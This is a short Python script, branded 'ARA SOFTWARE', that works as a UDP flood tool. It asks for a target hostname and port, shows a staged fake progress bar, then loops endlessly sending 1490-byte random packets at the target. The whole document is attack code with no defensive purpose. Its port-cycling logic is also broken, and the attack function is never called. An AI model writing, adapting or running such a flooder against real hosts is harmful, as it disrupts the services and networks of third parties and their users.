
import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
def attack():
    os.system("cls")
    print ("")
    print ("")
    print ("   ARA SOFTWARE    ")
    print ("")
    host = input("name Target : ")
    ip = socket.gethostbyname(host)
    port = input("Port       : ")
    s = int(port)

    os.system("clear")
    print ("")

    print ("[                    ] 0% ")
    time.sleep(5)
    print ("[=====               ] 25%")
    time.sleep(5)
    print ("[==========          ] 50%")
    time.sleep(5)
    print ("[===============     ] 75%")
    time.sleep(5)
    print ("[====================] 100%")
    time.sleep(3)
    sent = 0
    while True:
        sock.sendto(bytes, (ip,s))
        sent = sent + 1
        port = s + 1
        print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
        if port == 65534:
            port = 1

